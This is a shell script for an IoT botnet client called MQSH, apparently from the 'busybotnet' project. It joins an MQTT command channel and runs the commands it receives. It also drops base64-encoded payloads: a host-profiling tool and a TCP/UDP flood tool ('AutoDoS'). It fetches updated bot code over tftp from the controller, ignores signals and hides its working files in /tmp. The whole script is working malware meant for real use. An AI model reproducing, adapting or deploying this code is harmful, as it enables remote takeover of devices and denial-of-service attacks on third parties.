#            __   __       			 
#      |\/| /  \ /__` |__| 			 
#      |  | \__X .__/ |  | 	
		 
# https://github.com/isdrupter/busybotnet

publish(){
uxt=`date +%s`
jshout=$workdir/jshout.$uxt
if ([[ $debug == "1" ]]);then echo "publishing output to topic $pubtopic on $host";fi
(jsh cat $out | base64) 2>> $errorlog > $jshout
#(jsh cat $out |xorpipe - - $key | base64) 2>> $errorlog > $jshout # [*] xor enc
#(jsh cat $out |fenc e $key | base64) 2>> $errorlog > $jshout [*] fenc/salsa20 enc

if ([[ "$?" -eq "0" ]] && [[ -s $out ]]); then
  pubclient -h $host -i ${ip} -q 2 -t "data/$pubtop" -u bot -P $pass -f $jshout
fi
(rm $out;rm $jshout) 2>/dev/null
} 
execute(){
_cmd_=$workdir/_cmd_ ; echo $@ > $_cmd_
uxt=$(date +%s)
out="$workdir/output.${uxt}"
cmdpid="$piddir/output.${uxt}.pid"
(((ash $_cmd_) ; echo "$!" > $cmdpid) 2>> $errorlog > $out ); ((if [[ -s $out ]] ; then publish $out; fi &)&)
rm $cmdpid 
if ([[ $debug == "1" ]]);then echo 'Executed command in a thread';fi
} 
spitSomeBin(){
cat << EOF > /tmp/jsh

IyEvdmFyL2Jpbi9hc2gKI21ha2UgYSBjbWQganNvbgoKCnRlbXBmPS90bXAvLm1xc2gvanNoY21kCmlucHV0PS90bXAvLm1xc2gvX2NtZF8KZWNobyAkQCA+ICR0ZW1wZgpiYmo9IiQoanNob24gLXMgMj4vZGV2L251bGwgMT4vZGV2L251bGwpIgppcD0kYmJqIiQoL3NiaW4vaWZjb25maWcgZXRoMSB8IGdyZXAgTWFzayB8IGN1dCAtZCAnOicgLWYyIHwgY3V0IC1kICIgIiAtZjEpIgp1bml4dGltZT0kYmJqIiQoZGF0ZSArJXMpIgpkYXRlPSRiYmoiJChkYXRlKSIKdXB0aW1lPSRiYmoiJCh1cHRpbWUgfCBzZWQgcy9cLC8vKSIKa2VybmVsY21kbGluZT0kYmJqIiQoY2F0IC9wcm9jL2NtZGxpbmUpIgppZD0kYmJqIiQoaWQpIgprY3J5cHRvPSRiYmoiJChjYXQgL3Byb2MvY3J5cHRvIHwgZ3JlcCBuYW1lIHwgY3V0IC1kJzonIC1mMiB8IHVuaXEgfCB0ciAtcyAnXG4nICcgJ3xzZWQgcy9cLC8vKSIKdmVyc2lvbj0kYmJqIiQoY2F0IC9wcm9jL3ZlcnNpb24pIgptZW1zdGF0PSRiYmoiJChjYXQgL3Byb2MvbWVtaW5mbyB8IGhlYWQgLW4gMyB8IHRyIC1zICdcbicgJyAnKSIKY3dkPSRiYmoiJChwd2QpIgpzaGVsbD0kYmJqIiQoZWNobyAkU0hFTEwpIgpnZXRzdHR5PSRiYmoiJChzdHR5KSIKdGVybT0kYmJqIiQoZWNobyAkVEVSTSkiCmNwdW5hbWU9JGJiaiIkKGNhdCAvcHJvYy9jcHVpbmZvIHwgZ3JlcCBuYW1lKSIKI291dHB1dD0kYmJqIiQoJGNtZGxpbmUpIgpzdGF0dXM9JGJiaiIkKGlmIChbIC1zIC90bXAvLnN0YXR1cyBdICYmIFsgLWYgL3RtcC8uc3RhdHVzIF0pOyB0aGVuIGVjaG8gIlNZU1RFTV9CVVNZIiA7IGVsc2UgZWNobyAiU1lTVEVNX1JFQURZIjtmaSkiCmhhc2hjbWQ9JGJiaiIkKG1kNXN1bSAkdGVtcGYgfCBzZWQgLWUgJ3MvXCAgXC90bXBcLy5tcXNoXC9qc2hjbWRcPi8vZycpIgp1dWlkPSRiYmoiJyR1bml4dGltZS4kaGFzaGNtZCciCm91dHB1dD0kYmJqIickKGFzaCAkdGVtcGYpJyIKY21kbGluZT0kYmJqIiQoZWNobyAkKGNhdCAkaW5wdXQpKSIKCmVjaG8gJ3sKImlwIiA6ICInJGlwJyIsCiJ1bml4dGltZSI6ICInJHVuaXh0aW1lJyIsCiJkYXRlIjogIickZGF0ZSciLAoidXB0aW1lIiA6ICInJHVwdGltZSciLAoiY3B1bmFtZSI6ICInJGNwdW5hbWUnIiwKIm1lbXN0YXQiIDogIickbWVtc3RhdCciLAoiaWQiIDogIickaWQnIiwKInZlcnNpb24iIDogIickdmVyc2lvbiciLAoia2VybmVsX2NtZGxpbmUiOiAiJyRrZXJuZWxjbWRsaW5lJyIsCiJrZXJuZWxfY3J5cHRvIjogIicka2NyeXB0byciLAoic2hlbGwiOiAiJyRzaGVsbCciLAoidGVybSI6ICInJHRlcm0nIiwKInN0dHkiOiAiJyRnZXRzdHR5JyIsCiJjd2QiOiAiJyRjd2QnIiwKInV1aWQiOiAiJyR1dWlkJyIsCiJzdGF0dXMiOiAiJyRzdGF0dXMnIiwKImNtZGxpbmUiOiAiJyRjbWRsaW5lJyIsCiJvdXRwdXQiOiAiJyRvdXRwdXQnIgp9JyAyPi9kZXYvbnVsbAoKCgo=

EOF
(cat /tmp/jsh | base64 -d >/var/bin/jsh ; chmod +x /var/bin/jsh)2>>$errorlog
cat << EOF > /tmp/dos 

IyEvdmFyL2Jpbi9hc2gKIyBBdXRvRG9TIC0gU2hlbGwgV3JhcHBlciB0byBTZW5kIE11bHRpcGxlIFNwb29mZWQgUGFja2V0cwojIFNoZWxselJ1cyAyMDE2CiMKCm1vZGU9JDEKaXA9JDIKcG9ydD0kezM6LSI4MCJ9CnRocmVhZHM9JHs0Oi0iNSJ9CnNlY3M9JHs1Oi0iMzAifQoKc3RhdGZpbGU9L3RtcC8uc3RhdHVzCgoKI1NFUSgpe2k9MDt3aGlsZSBbWyAiJGkiIC1sdCAxMCBdXTtkbyBlY2hvICRpOyBpPWBleHByICRpICsgMWA7ZG9uZX0KdXNhZ2UoKXsKZWNobyAiIFwKLSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy0KIEF1dG8tRG9zIFZlcnNpb24gMy4wCiAgVXNhZ2U6CiAgJDAgW3RhcmdldCBpcF1bcG9ydF1bdGhyZWFkc11bc2Vjc10KICBEZWZhdWx0OiA1IHRocmVhZHMvMzAgc2VjIE1heDogMjAgdGhyZWFkcy8zMDAgc2VjCi0jIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy0iCn0KCmZpbmlzaCgpewogICAgaWYgW1sgLXMgIiRzdGF0ZmlsZSIgXV07dGhlbgogICAgID4kc3RhdGZpbGUKICAgIGZpCn0KCnRjcCgpewojZWNobyAiJHRoaXNib3QgOiIKcG9ydD0kezI6LSI4MCJ9CnRocmVhZHM9JHszOi0iNSJ9CnNlY3M9JHs0Oi0iMzAifQplY2hvICJIaXR0aW5nICRpcDokcG9ydCBGb3IgJHNlY3Mgc2VjcyB3aXRoICR0aHJlYWRzIHRocmVhZHMgbW9kZSB0Y3AiCnNzeW4yICRpcCAkcG9ydCAkdGhyZWFkcyAkc2VjcyA+L2Rldi9udWxsICYgZWNobyAiJCEiID4gJHN0YXRmaWxlCnNsZWVwICRzZWNzICYmIGZpbmlzaAp9CnVkcCgpewpwb3J0PSR7MjotIjgwIn0KdGhyZWFkcz0kezM6LSI1In0Kc2Vjcz0kezQ6LSIzMCJ9CiNlY2hvICIkdGhpc2JvdCA6IgplY2hvICJIaXR0aW5nICRpcDokcG9ydCBmb3IgJHNlY3Mgc2VjcyB3aXRoICR0aHJlYWRzIHRocmVhZHMgbW9kZSB1ZHAiCnN1ZHAgJGlwICRwb3J0IDEgJHRocmVhZHMgJHNlY3MgPi9kZXYvbnVsbCAmIGVjaG8gIiQhIiA+ICRzdGF0ZmlsZQpzbGVlcCAkc2VjcyAmJiBmaW5pc2gKfQoKa2lsbEl0KCl7CmtpbGwgLTkgYGNhdCAkc3RhdGZpbGVgOyhbICIkPyIgLWVxICIwIiBdKSAmJiBlY2hvICJLaWxsZWQiOz4kc3RhdGZpbGUKfQoKY2hlY2soKXsKCmlmIFtbICEgLWYgJHN0YXRmaWxlIF1dO3RoZW4gdG91Y2ggJHN0YXRmaWxlO2ZpCnN0YXQ9YGNhdCAkc3RhdGZpbGVgCiN0aGlzQm90PWAvc2Jpbi9pZmNvbmZpZyBldGgxIHwgZ3JlcCBNYXNrIHwgY3V0IC1kICc6JyAtZjIgfCBjdXQgLWQgIiAiIC1mMWAKaWYgKFtbICIkaXAiID09ICIiIF1dIHx8IFtbICIkcG9ydCIgPT0gIiIgXV0gfHwgW1sgIiR0aHJlYWRzIiAtZ3QgIjIwIiBdXSB8fCBbWyAiJHNlY3MiIC1ndCAiMzAwIiBdXSApCnRoZW4KdXNhZ2UKZXhpdCAxCmVsc2UgCmlmIFsgLXMgJHN0YXRmaWxlIF0gO3RoZW4KZWNobyBTeXN0ZW0gaXMgYnVzeS4gV2FpdCBhIG1pbnV0ZS4KZXhpdCAxCmZpCmZpCn0KCmNhc2UgJG1vZGUgaW4gLXR8LS10Y3ApCgpjaGVjawp0cmFwIGZpbmlzaCAxIDIgOAp0Y3AgJGlwICRwb3J0ICR0aHJlYWRzICRzZWNzCgo7OwotdXwtLXVkcCkKY2hlY2sKdHJhcCBmaW5pc2ggMSAyIDgKdWRwIGlwICRwb3J0ICR0aHJlYWRzICRzZWNzCgo7OwoKLWt8LS1raWxsKQpraWxsSXQKOzsKKikKZWNobyAiJDAgW21vZGVbLS10Y3AvLS11ZHBdXSBbaXBdIFtwb3J0XSBbdGhyZWFkXSBbc2Vjc10iCjs7CmVzYWMKCmV4aXQK 

EOF
(cat /tmp/dos | base64 -d > /var/bin/dos  ; chmod +x /var/bin/dos)2>>$errorlog
} 
ctrl_c(){
    echo -en "\n## Caught SIGINT; Clean up and Exit \n"
    kill `cat $pidfile`
    rm $pipe $enc $denc $workdir/output* 2>/dev/null
    exit
}
quit(){ 
rm $pipe $enc $denc $workdir/output*
kill -9 `cat $pidfile`
rm $pidfile;reboot;exit 
} 
update(){
trap "" 1 2
(time=`awk -v min=5 -v max=60 'BEGIN{srand(); print int(min+rand()*(max-min+1))}'`; \
cd /var/bin;rm mq;kill -9 `cat $pidfile`; \
for i in 1 2 3 4 5;do \
  echo "Mqsh Updating: attempt $i"; \
  cd /var/bin;>mq;tftp -g -r mq $host; \
  if [[ "$?" -eq "0" ]];then \
    (nohup ash mq) && break;  \
     else \
    sleep $time; \
  fi; \
done)
} 
run(){
enc=$workdir/enc;denc=$workdir/denc
if ([[ $debug == "1" ]]); then  
  echo Host: "$host" ;echo Pass :"$pass" ;echo Debug: "$debug" ;echo Path:"$path"
fi
if [[ ! -p "$pipe" ]]; then mkfifo $pipe ;fi
(subclient -h $host -q 2 -i ${ip} -t shell/$subtop -u bot -P $pass > $pipe) & echo "$!" > $pidfile
while read line <$pipe; do
# We don't have TLS working yet, but you can use a psk to encrypt messages for now:
(echo "$line" | base64 -d) 2>> $errorlog > $denc # base64 encoding only
#(echo "$line" | base64 -d | xorpipe - - $key) 2>> $errorlog > $denc # [*] xor encryption (not very secure)
#(echo "$line" | base64 -d | fenc d $key) 2>> $errorlog > $denc # [*] fenc/salsa20 encryption (pretty secure)

    if grep -q '__quit__' $denc; then 
      echo 'Received quit, bailing!'
        quit;break
    elif grep -q '_update_' $denc;then
        echo 'Received update, getting new config...'
        update
    elif grep -q '_killall_' $denc;then
        echo 'Received killall, killing all threads...'
        for i in $(ls $piddir);do
          echo "Killing $i"
          kill $(cat $piddir/$i)
        done
    else
      if ([[ $debug == "1" ]]);then echo Received a command, will exec...;fi
      cmd=$(cat $denc) ; execute ${cmd} &  >$enc ; > $denc
    fi
done }
workdir="/tmp/.mqsh"
piddir="$workdir/pids"
if [[ ! -d $workdir ]];then mkdir $workdir;fi
if [[ ! -d $piddir ]];then mkdir $piddir;fi
pipe=$workdir/p
pidfile=$workdir/sub.pid
errorlog="$workdir/error.log"
host=${1:-"127.0.0.1"}
pass=${2:-"password"}
path=${3:-"/usr/sbin:/bin:/usr/bin:/sbin:/var/bin"}
debug=${4:-"0"}
intf=${5:-"eth0"}
subtop=${6:-"in"}
pubtop=${7:-"out"}
ip=$(/sbin/ifconfig $intf | grep Mask | cut -d ':' -f2 | cut -d " " -f1)
# [*] for encryption of messages (we need tls!)
#key="$workdir/key"
#echo 'xegwXos7sZe1WNRT' > $key

echo "MqSH Version 1.0-----------------------------------------------"
echo "Usage: [$0][[host]default:127.0.0.1]][[pass][default:password]]"
echo "             \ [[path][[default:/var/bin]][[debug][[default:0]]"
echo "		    \ [[nicid]]	[[subtopic]][[pubtopic]]	     "
echo "Options:-------------------------------------------------------"
export PATH=$path
if ([[ "$debug" == "1" ]]);then
  spitSomeBin
  trap ctrl_c 2
  run $host $pass $path $debug $key $intf $subtop $pubtop 
else
  trap "" 1 2 8
  spitSomeBin 2>>$errorlog
  run $host $pass $path $debug $key $intf $subtop $pubtop  2>>$errorlog & 
fi
